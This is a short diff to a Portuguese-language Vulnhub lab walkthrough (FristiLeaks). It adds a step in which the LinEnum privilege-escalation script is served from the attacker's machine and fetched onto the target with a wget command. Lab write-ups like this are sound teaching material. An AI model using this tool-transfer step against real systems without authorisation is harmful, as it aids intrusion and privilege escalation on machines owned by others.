@@ -174,5 +174,8 @@ Se você não tem o LinEnum em sua máquina, você pode realizar o download. [AQ
 
 `cp /root/fatec/172.17.0.2/download/LinEnum.sh /var/www/html/`
 
+Na máquina alvo realize o download.
+
+`wget http://10.0.1.104/LinEnum.sh`
 
 ![trasnfer](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_12-50.png)
